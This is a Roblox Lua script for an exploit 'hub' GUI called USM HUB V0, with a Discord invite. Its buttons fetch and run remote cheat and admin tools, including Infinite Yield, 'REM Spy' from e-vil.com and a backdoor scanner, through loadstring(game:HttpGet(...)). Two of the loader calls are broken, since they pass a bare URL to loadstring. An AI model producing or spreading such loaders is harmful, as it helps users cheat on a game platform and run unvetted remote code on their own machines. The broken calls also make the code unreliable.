-- USM HUB V0 UPDATE: ORGINIZATION TO SCRIPT.

-- Instances:

local USMHUBV0 = Instance.new("ScreenGui")
local RedBacground = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local mainframe = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local InfiniteYeild = Instance.new("TextButton")
local StrawberryAdmin = Instance.new("TextButton")
local REM = Instance.new("TextButton")
local USMMenyoo = Instance.new("TextButton")
local LalolHub = Instance.new("TextButton")
local CORD = Instance.new("TextLabel")
local USM = Instance.new("ImageLabel")
local USM_2 = Instance.new("ImageLabel")
local USM_3 = Instance.new("ImageLabel")
local USM_4 = Instance.new("ImageLabel")

--Properties:

USMHUBV0.Name = "USM HUB V0"
USMHUBV0.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
USMHUBV0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

RedBacground.Name = "Red Bacground"
RedBacground.Parent = USMHUBV0
RedBacground.BackgroundColor3 = Color3.fromRGB(70, 14, 14)
RedBacground.BackgroundTransparency = 0.300
RedBacground.BorderColor3 = Color3.fromRGB(0, 0, 0)
RedBacground.BorderSizePixel = 0
RedBacground.Position = UDim2.new(0.37327221, 0, 0.349999964, 0)
RedBacground.Size = UDim2.new(0, 454, 0, 300)

UICorner.Parent = RedBacground

mainframe.Name = "main frame"
mainframe.Parent = RedBacground
mainframe.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
mainframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainframe.BorderSizePixel = 0
mainframe.Position = UDim2.new(0.023568308, 0, 0.0299999993, 0)
mainframe.Size = UDim2.new(0, 433, 0, 282)

UICorner_2.Parent = mainframe

InfiniteYeild.Name = "Infinite Yeild"
InfiniteYeild.Parent = mainframe
InfiniteYeild.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
InfiniteYeild.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYeild.BorderSizePixel = 0
InfiniteYeild.Position = UDim2.new(0.115000002, 0, 0.0500000007, 0)
InfiniteYeild.Size = UDim2.new(0, 332, 0, 25)
InfiniteYeild.Font = Enum.Font.Unknown
InfiniteYeild.LineHeight = 3.000
InfiniteYeild.Text = "Infinite Yeild"
InfiniteYeild.TextColor3 = Color3.fromRGB(189, 127, 13)
InfiniteYeild.TextScaled = true
InfiniteYeild.TextSize = 14.000
InfiniteYeild.TextWrapped = true

StrawberryAdmin.Name = "Strawberry Admin"
StrawberryAdmin.Parent = mainframe
StrawberryAdmin.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
StrawberryAdmin.BorderColor3 = Color3.fromRGB(0, 0, 0)
StrawberryAdmin.BorderSizePixel = 0
StrawberryAdmin.Position = UDim2.new(0.115000002, 0, 0.200000003, 0)
StrawberryAdmin.Size = UDim2.new(0, 332, 0, 25)
StrawberryAdmin.Font = Enum.Font.Unknown
StrawberryAdmin.LineHeight = 3.000
StrawberryAdmin.Text = "Strawberry Admin"
StrawberryAdmin.TextColor3 = Color3.fromRGB(189, 127, 13)
StrawberryAdmin.TextScaled = true
StrawberryAdmin.TextSize = 14.000
StrawberryAdmin.TextWrapped = true

REM.Name = "REM"
REM.Parent = mainframe
REM.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
REM.BorderColor3 = Color3.fromRGB(0, 0, 0)
REM.BorderSizePixel = 0
REM.Position = UDim2.new(0.115000002, 0, 0.349999994, 0)
REM.Size = UDim2.new(0, 332, 0, 25)
REM.Font = Enum.Font.Unknown
REM.LineHeight = 3.000
REM.Text = "REM Spy"
REM.TextColor3 = Color3.fromRGB(189, 127, 13)
REM.TextScaled = true
REM.TextSize = 14.000
REM.TextWrapped = true

USMMenyoo.Name = "USM Menyoo"
USMMenyoo.Parent = mainframe
USMMenyoo.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
USMMenyoo.BorderColor3 = Color3.fromRGB(0, 0, 0)
USMMenyoo.BorderSizePixel = 0
USMMenyoo.Position = UDim2.new(0.115000002, 0, 0.5, 0)
USMMenyoo.Size = UDim2.new(0, 332, 0, 25)
USMMenyoo.Font = Enum.Font.Unknown
USMMenyoo.LineHeight = 3.000
USMMenyoo.Text = "USM Menyoo"
USMMenyoo.TextColor3 = Color3.fromRGB(189, 127, 13)
USMMenyoo.TextScaled = true
USMMenyoo.TextSize = 14.000
USMMenyoo.TextWrapped = true

LalolHub.Name = "Lalol Hub"
LalolHub.Parent = mainframe
LalolHub.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
LalolHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
LalolHub.BorderSizePixel = 0
LalolHub.Position = UDim2.new(0.115000002, 0, 0.649999976, 0)
LalolHub.Size = UDim2.new(0, 332, 0, 25)
LalolHub.Font = Enum.Font.Unknown
LalolHub.LineHeight = 3.000
LalolHub.Text = "Lalol Hub"
LalolHub.TextColor3 = Color3.fromRGB(189, 127, 13)
LalolHub.TextScaled = true
LalolHub.TextSize = 14.000
LalolHub.TextWrapped = true

CORD.Name = "CORD"
CORD.Parent = mainframe
CORD.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
CORD.BorderColor3 = Color3.fromRGB(0, 0, 0)
CORD.BorderSizePixel = 0
CORD.Position = UDim2.new(0.115000002, 0, 0.800000012, 0)
CORD.Size = UDim2.new(0, 332, 0, 25)
CORD.Font = Enum.Font.Unknown
CORD.LineHeight = 3.000
CORD.Text = "discord.gg/cd6D5NUm3A"
CORD.TextColor3 = Color3.fromRGB(189, 127, 13)
CORD.TextScaled = true
CORD.TextSize = 14.000
CORD.TextWrapped = true

USM.Name = "USM"
USM.Parent = RedBacground
USM.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM.BackgroundTransparency = 1.000
USM.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM.BorderSizePixel = 0
USM.Position = UDim2.new(0.863495529, 0, 0.776233912, 0)
USM.Size = UDim2.new(0, 50, 0, 50)
USM.Image = "rbxassetid://130430205967906"
USM.ImageTransparency = 0.200

USM_2.Name = "USM"
USM_2.Parent = RedBacground
USM_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_2.BackgroundTransparency = 1.000
USM_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_2.BorderSizePixel = 0
USM_2.Position = UDim2.new(0.0241039116, 0, 0.777586877, 0)
USM_2.Size = UDim2.new(0, 50, 0, 50)
USM_2.Image = "rbxassetid://130430205967906"
USM_2.ImageTransparency = 0.200

USM_3.Name = "USM"
USM_3.Parent = RedBacground
USM_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_3.BackgroundTransparency = 1.000
USM_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_3.BorderSizePixel = 0
USM_3.Position = UDim2.new(0.865179241, 0, 0.0342535414, 0)
USM_3.Size = UDim2.new(0, 50, 0, 50)
USM_3.Image = "rbxassetid://130430205967906"
USM_3.ImageTransparency = 0.200

USM_4.Name = "USM"
USM_4.Parent = RedBacground
USM_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
USM_4.BackgroundTransparency = 1.000
USM_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
USM_4.BorderSizePixel = 0
USM_4.Position = UDim2.new(0.0213780347, 0, 0.0345072411, 0)
USM_4.Size = UDim2.new(0, 50, 0, 50)
USM_4.Image = "rbxassetid://130430205967906"
USM_4.ImageTransparency = 0.200

-- Scripts:

local function UKEB_fake_script() -- RedBacground.LocalScript 
	local script = Instance.new('LocalScript', RedBacground)

	-- LocalScript inside the Frame
	local frame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- When the player starts pressing on the frame
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- When the player moves the mouse/finger
	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	
end
coroutine.wrap(UKEB_fake_script)()
local function NXGIYOK_fake_script() -- InfiniteYeild.Script 
	local script = Instance.new('Script', InfiniteYeild)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end)
end
coroutine.wrap(NXGIYOK_fake_script)()
local function ZVACIVQ_fake_script() -- StrawberryAdmin.Script 
	local script = Instance.new('Script', StrawberryAdmin)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/nightly/scanner.lua"))()
	end)
end
coroutine.wrap(ZVACIVQ_fake_script)()
local function JFAJ_fake_script() -- REM.Script 
	local script = Instance.new('Script', REM)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
	end)
end
coroutine.wrap(JFAJ_fake_script)()
local function JWHR_fake_script() -- USMMenyoo.Script 
	local script = Instance.new('Script', USMMenyoo)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring("https://raw.githubusercontent.com/STEVEO-5TVO-01/USM/refs/heads/main/USMMenyoo.lua")
	end)
end
coroutine.wrap(JWHR_fake_script)()
local function BZCZNTO_fake_script() -- LalolHub.Script 
	local script = Instance.new('Script', LalolHub)

	local button = script.Parent
	
	button.MouseButton1Click:Connect(function()
		loadstring("https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/refs/heads/main/Backdoor-Scanner/script")
	end)
end
coroutine.wrap(BZCZNTO_fake_script)()

